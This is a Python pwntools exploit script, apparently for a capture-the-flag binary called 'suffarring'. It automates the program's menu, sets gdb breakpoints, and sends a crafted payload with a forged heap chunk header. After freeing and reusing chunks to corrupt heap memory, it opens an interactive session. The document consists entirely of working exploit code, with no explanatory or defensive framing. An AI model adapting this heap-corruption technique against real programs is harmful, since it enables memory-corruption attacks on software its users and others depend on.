from pwn import *
from heaputils import get_PIE

def add(text):
	p.sendline("A")
	p.recvuntil("> ")
	p.sendline(str(len(text)))
	p.recvuntil("> ")
	p.send(text)

def count(text_idx,needle):
	p.sendline("C")
	p.recvuntil("> ")
	p.sendline(str(text_idx))
	p.recvuntil("> ")
	p.sendline(str(len(needle)))
	p.recvuntil("> ")
	p.send(needle)
	p.recvuntil("Occurrences: ")
	cnt = int(p.recvline())
	return cnt

def recant(text_idx,needle):
	p.sendline("R")
	p.recvuntil("> ")
	p.sendline(str(text_idx))
	p.recvuntil("> ")
	p.sendline(str(len(needle)))
	p.recvuntil("> ")
	p.send(needle)

def delete(idx):
	p.sendline("D")
	p.recvuntil("> ")
	p.sendline(str(idx))

def debug():
	bp = [0x12C9,0x131E ]
	script = ""
	for x in bp:
		script+="b *0x%x\n"%(x+PIE)
	gdb.attach(p,gdbscript=script)


if __name__ == "__main__":

	p = process("./suffarring")

	PIE = get_PIE(p)

	payload = p64(0)*2 #our data
	payload += p64(0)+p64(0x31) #next heap header
	payload += p64(0x100)+chr(0)


	add ("A"*0x10)
	add ('')
	add (payload)
	delete(1)

	recant (2, payload+"\x00")
	p.interactive()